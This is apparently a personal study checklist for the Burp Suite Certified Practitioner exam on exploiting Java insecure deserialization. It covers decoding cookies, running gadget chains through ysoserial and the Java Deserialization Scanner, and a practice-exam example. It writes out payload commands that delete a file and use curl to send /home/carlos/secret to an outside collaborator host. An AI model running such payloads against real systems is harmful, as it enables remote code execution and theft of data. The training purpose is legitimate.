- [ ] Look for cookies or header/body values that look long and semi-random. It's hard to explain but things like the below would be a good start ![[Technical/Web/Methodology/BSCP Security Testing Checklist/Images/Pasted image 20250928162846.png]]
- [ ] Send the value to **Decoder** and keep decoding it to you hit the serial value as shown below ![[Technical/Web/Methodology/BSCP Security Testing Checklist/Images/Pasted image 20250928163110.png]]
	- [ ] Send the request to Deserialisation scanner, then manually under exploitation try each collection with `CommonsCollections1 'dig BURP_COLLABORATOR_LINK'` until you get one. The list can be found at  https://github.com/frohoff/ysoserial?tab=readme-ov-file#usage trying all the payload values (also make sure the correct encoding/compress at the bottom)
	- [ ] If not pop open a WSL (Windows Subsystem for Linux) terminal and install openjdk 1.8.0.462, and run a command like `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0` to remove the payload.
- [ ] Wrap your command in something like `CommonsCollections7 'curl https://burpcollab.oastify.net -d @/home/carlos/secret'`

## Example Issues

**Insecure Deserialization of CommonsCollections7 from Admin Prefs Cookie in Practice Exam 1**
- Started off looking up the cookie in decoder and found that if we URL Decoded > Base64 Decoded > GZip Decoded we ended up getting a java serial object.
- We sent this to Java Deserialization Scanner and we did a manual exploitation scan with DNS (vuln libraries)
- We did a `CommonsCollections7 'curl https://burpcollab.oastify.net -d @/home/carlos/secret'` on the exploitation tab of Java Deserialization Scanner to obtain the correct lookup in collaborator and exfiltrate the secret.
